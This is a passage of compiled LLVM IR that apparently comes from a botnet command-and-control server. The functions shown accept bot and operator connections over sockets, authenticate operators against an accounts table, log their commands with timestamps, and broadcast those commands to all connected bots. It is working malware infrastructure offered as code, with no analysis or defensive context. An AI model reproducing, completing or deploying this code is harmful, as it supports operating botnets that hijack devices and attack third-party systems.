  %576 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %576, i8 0, i64 2048, i1 false)
  %577 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %578 = call i32 (i8*, i8*, ...) @sprintf(i8* %577, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.54, i64 0, i64 0)) #9
  %579 = load i32, i32* %4, align 4
  %580 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %581 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %582 = call i64 @strlen(i8* %581) #8
  %583 = call i64 @send(i32 %579, i8* %580, i64 %582, i32 16384)
  %584 = icmp eq i64 %583, -1
  br i1 %584, label %585, label %586

585:                                              ; preds = %575
  br label %753

586:                                              ; preds = %575
  %587 = load i32, i32* %4, align 4
  %588 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %589 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %590 = call i64 @strlen(i8* %589) #8
  %591 = call i64 @send(i32 %587, i8* %588, i64 %590, i32 16384)
  %592 = icmp eq i64 %591, -1
  br i1 %592, label %593, label %594

593:                                              ; preds = %586
  br label %753

594:                                              ; preds = %586
  %595 = load i32, i32* %4, align 4
  %596 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %597 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %598 = call i64 @strlen(i8* %597) #8
  %599 = call i64 @send(i32 %595, i8* %596, i64 %598, i32 16384)
  %600 = icmp eq i64 %599, -1
  br i1 %600, label %601, label %602

601:                                              ; preds = %594
  br label %753

602:                                              ; preds = %594
  %603 = load i32, i32* %4, align 4
  %604 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %605 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %606 = call i64 @strlen(i8* %605) #8
  %607 = call i64 @send(i32 %603, i8* %604, i64 %606, i32 16384)
  %608 = icmp eq i64 %607, -1
  br i1 %608, label %609, label %610

609:                                              ; preds = %602
  br label %753

610:                                              ; preds = %602
  %611 = load i32, i32* %4, align 4
  %612 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %613 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %614 = call i64 @strlen(i8* %613) #8
  %615 = call i64 @send(i32 %611, i8* %612, i64 %614, i32 16384)
  %616 = icmp eq i64 %615, -1
  br i1 %616, label %617, label %618

617:                                              ; preds = %610
  br label %753

618:                                              ; preds = %610
  %619 = load i32, i32* %4, align 4
  %620 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %621 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %622 = call i64 @strlen(i8* %621) #8
  %623 = call i64 @send(i32 %619, i8* %620, i64 %622, i32 16384)
  %624 = icmp eq i64 %623, -1
  br i1 %624, label %625, label %626

625:                                              ; preds = %618
  br label %753

626:                                              ; preds = %618
  %627 = load i32, i32* %4, align 4
  %628 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %629 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %630 = call i64 @strlen(i8* %629) #8
  %631 = call i64 @send(i32 %627, i8* %628, i64 %630, i32 16384)
  %632 = icmp eq i64 %631, -1
  br i1 %632, label %633, label %634

633:                                              ; preds = %626
  br label %753

634:                                              ; preds = %626
  %635 = load i32, i32* %4, align 4
  %636 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %637 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %638 = call i64 @strlen(i8* %637) #8
  %639 = call i64 @send(i32 %635, i8* %636, i64 %638, i32 16384)
  %640 = icmp eq i64 %639, -1
  br i1 %640, label %641, label %642

641:                                              ; preds = %634
  br label %753

642:                                              ; preds = %634
  %643 = load i32, i32* %4, align 4
  %644 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %645 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %646 = call i64 @strlen(i8* %645) #8
  %647 = call i64 @send(i32 %643, i8* %644, i64 %646, i32 16384)
  %648 = icmp eq i64 %647, -1
  br i1 %648, label %649, label %650

649:                                              ; preds = %642
  br label %753

650:                                              ; preds = %642
  %651 = load i32, i32* %4, align 4
  %652 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %653 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %654 = call i64 @strlen(i8* %653) #8
  %655 = call i64 @send(i32 %651, i8* %652, i64 %654, i32 16384)
  %656 = icmp eq i64 %655, -1
  br i1 %656, label %657, label %658

657:                                              ; preds = %650
  br label %753

658:                                              ; preds = %650
  br label %659

659:                                              ; preds = %658
  %660 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i64 0, i64 0
  %661 = load i32, i32* %5, align 4
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %662
  %664 = getelementptr inbounds %struct.login_info, %struct.login_info* %663, i32 0, i32 0
  %665 = getelementptr inbounds [100 x i8], [100 x i8]* %664, i64 0, i64 0
  %666 = call i32 (i8*, i8*, ...) @sprintf(i8* %660, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.31, i64 0, i64 0), i8* %665) #9
  %667 = load i32, i32* %4, align 4
  %668 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i64 0, i64 0
  %669 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i64 0, i64 0
  %670 = call i64 @strlen(i8* %669) #8
  %671 = call i64 @send(i32 %667, i8* %668, i64 %670, i32 16384)
  %672 = icmp eq i64 %671, -1
  br i1 %672, label %673, label %674

673:                                              ; preds = %659
  br label %753

674:                                              ; preds = %659
  br label %675

675:                                              ; preds = %674
  br label %299, !llvm.loop !19

676:                                              ; preds = %571
  %677 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %678 = call i8* @strstr(i8* %677, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.55, i64 0, i64 0)) #8
  %679 = icmp ne i8* %678, null
  br i1 %679, label %680, label %698

680:                                              ; preds = %676
  %681 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %681, i8 0, i64 2048, i1 false)
  %682 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  %683 = load i32, i32* %5, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %684
  %686 = getelementptr inbounds %struct.login_info, %struct.login_info* %685, i32 0, i32 0
  %687 = getelementptr inbounds [100 x i8], [100 x i8]* %686, i64 0, i64 0
  %688 = call i32 (i8*, i8*, ...) @sprintf(i8* %682, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.56, i64 0, i64 0), i8* %687) #9
  %689 = load i32, i32* %4, align 4
  %690 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  %691 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  %692 = call i64 @strlen(i8* %691) #8
  %693 = call i64 @send(i32 %689, i8* %690, i64 %692, i32 16384)
  %694 = icmp eq i64 %693, -1
  br i1 %694, label %695, label %696

695:                                              ; preds = %680
  br label %753

696:                                              ; preds = %680
  %697 = call i32 @sleep(i32 2)
  br label %753

698:                                              ; preds = %676
  %699 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %699)
  %700 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i64 0, i64 0
  %701 = load i32, i32* %5, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %702
  %704 = getelementptr inbounds %struct.login_info, %struct.login_info* %703, i32 0, i32 0
  %705 = getelementptr inbounds [100 x i8], [100 x i8]* %704, i64 0, i64 0
  %706 = call i32 (i8*, i8*, ...) @sprintf(i8* %700, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.31, i64 0, i64 0), i8* %705) #9
  %707 = load i32, i32* %4, align 4
  %708 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i64 0, i64 0
  %709 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i64 0, i64 0
  %710 = call i64 @strlen(i8* %709) #8
  %711 = call i64 @send(i32 %707, i8* %708, i64 %710, i32 16384)
  %712 = icmp eq i64 %711, -1
  br i1 %712, label %713, label %714

713:                                              ; preds = %698
  br label %753

714:                                              ; preds = %698
  %715 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %716 = call i64 @strlen(i8* %715) #8
  %717 = icmp eq i64 %716, 0
  br i1 %717, label %718, label %719

718:                                              ; preds = %714
  br label %299, !llvm.loop !19

719:                                              ; preds = %714
  %720 = load i32, i32* %5, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %721
  %723 = getelementptr inbounds %struct.login_info, %struct.login_info* %722, i32 0, i32 0
  %724 = getelementptr inbounds [100 x i8], [100 x i8]* %723, i64 0, i64 0
  %725 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %726 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.57, i64 0, i64 0), i8* %724, i8* %725)
  %727 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i64 0, i64 0))
  store %struct._IO_FILE* %727, %struct._IO_FILE** %57, align 8
  %728 = call i64 @time(i64* null) #9
  store i64 %728, i64* %58, align 8
  %729 = call %struct.tm* @gmtime(i64* %58) #9
  store %struct.tm* %729, %struct.tm** %59, align 8
  %730 = getelementptr inbounds [50 x i8], [50 x i8]* %60, i64 0, i64 0
  %731 = load %struct.tm*, %struct.tm** %59, align 8
  %732 = call i64 @strftime(i8* %730, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.60, i64 0, i64 0), %struct.tm* %731) #9
  %733 = load %struct._IO_FILE*, %struct._IO_FILE** %57, align 8
  %734 = getelementptr inbounds [50 x i8], [50 x i8]* %60, i64 0, i64 0
  %735 = load i32, i32* %5, align 4
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %736
  %738 = getelementptr inbounds %struct.login_info, %struct.login_info* %737, i32 0, i32 0
  %739 = getelementptr inbounds [100 x i8], [100 x i8]* %738, i64 0, i64 0
  %740 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %741 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %733, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.61, i64 0, i64 0), i8* %734, i8* %739, i8* %740)
  %742 = load %struct._IO_FILE*, %struct._IO_FILE** %57, align 8
  %743 = call i32 @fclose(%struct._IO_FILE* %742)
  %744 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %745 = load i32, i32* %4, align 4
  %746 = load i32, i32* %5, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %747
  %749 = getelementptr inbounds %struct.login_info, %struct.login_info* %748, i32 0, i32 0
  %750 = getelementptr inbounds [100 x i8], [100 x i8]* %749, i64 0, i64 0
  call void @broadcast(i8* %744, i32 %745, i8* %750)
  %751 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %751, i8 0, i64 2048, i1 false)
  br label %299, !llvm.loop !19

752:                                              ; preds = %299
  br label %753

753:                                              ; preds = %752, %713, %696, %695, %673, %657, %649, %641, %633, %625, %617, %609, %601, %593, %585, %568, %552, %534, %517, %509, %501, %493, %485, %477, %469, %461, %430, %413, %405, %397, %389, %381, %356, %290, %274, %266, %258, %250, %242, %234, %226, %218, %190, %189, %170, %164, %149, %121, %115
  %754 = load i32, i32* %4, align 4
  %755 = sext i32 %754 to i64
  %756 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %755
  %757 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %756, i32 0, i32 0
  store i32 0, i32* %757, align 4
  %758 = load i32, i32* %4, align 4
  %759 = call i32 @close(i32 %758)
  %760 = load volatile i32, i32* @OperatorsConnected, align 4
  %761 = add nsw i32 %760, -1
  store volatile i32 %761, i32* @OperatorsConnected, align 4
  br label %762

762:                                              ; preds = %753, %341, %333, %325
  %763 = load i8*, i8** %2, align 8
  ret i8* %763
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.62, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.63, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 %28, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.64, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.65, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.66, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.67, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** @telFD, align 8
  %29 = load i8**, i8*** %6, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31) #8
  store i32 %32, i32* %9, align 4
  %33 = load i8**, i8*** %6, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @create_and_bind(i8* %35)
  store volatile i32 %36, i32* @listenFD, align 4
  %37 = load volatile i32, i32* @listenFD, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

39:                                               ; preds = %23
  call void @abort() #11
  unreachable

40:                                               ; preds = %23
  %41 = load volatile i32, i32* @listenFD, align 4
  %42 = call i32 @make_socket_non_blocking(i32 %41)
  store i32 %42, i32* %8, align 4
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  call void @abort() #11
  unreachable

46:                                               ; preds = %40
  %47 = load volatile i32, i32* @listenFD, align 4
  %48 = call i32 @listen(i32 %47, i32 4096) #9
  store i32 %48, i32* %8, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %46
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.68, i64 0, i64 0))
  call void @abort() #11
  unreachable

52:                                               ; preds = %46
  %53 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %53, i32* @epollFD, align 4
  %54 = load volatile i32, i32* @epollFD, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %57

56:                                               ; preds = %52
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i64 0, i64 0))
  call void @abort() #11
  unreachable

57:                                               ; preds = %52
  %58 = load volatile i32, i32* @listenFD, align 4
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %60 = bitcast %union.epoll_data* %59 to i32*
  store i32 %58, i32* %60, align 1
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %61, align 1
  %62 = load volatile i32, i32* @epollFD, align 4
  %63 = load volatile i32, i32* @listenFD, align 4
  %64 = call i32 @epoll_ctl(i32 %62, i32 1, i32 %63, %struct.epoll_event* %11) #9
  store i32 %64, i32* %8, align 4
  %65 = load i32, i32* %8, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %57
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  call void @abort() #11
  unreachable

68:                                               ; preds = %57
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 2
  %71 = zext i32 %70 to i64
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %12, align 8
  %73 = alloca i64, i64 %71, align 16
  store i64 %71, i64* %13, align 8
  br label %74

74:                                               ; preds = %78, %68
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %75, -1
  store i32 %76, i32* %9, align 4
  %77 = icmp ne i32 %75, 0
  br i1 %77, label %78, label %84

78:                                               ; preds = %74
  %79 = load i32, i32* %9, align 4
  %80 = add nsw i32 %79, 1
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i64, i64* %73, i64 %81
  %83 = call i32 @pthread_create(i64* %82, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #9
  br label %74, !llvm.loop !20

84:                                               ; preds = %74
  %85 = getelementptr inbounds i64, i64* %73, i64 0
  %86 = load i32, i32* %10, align 4
  %87 = sext i32 %86 to i64
  %88 = inttoptr i64 %87 to i8*
  %89 = call i32 @pthread_create(i64* %85, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %88) #9
  br label %90

90:                                               ; preds = %91, %84
  br label %91

91:                                               ; preds = %90
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.70, i64 0, i64 0))
  %92 = call i32 @sleep(i32 60)
  br label %90
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.72, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !21

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
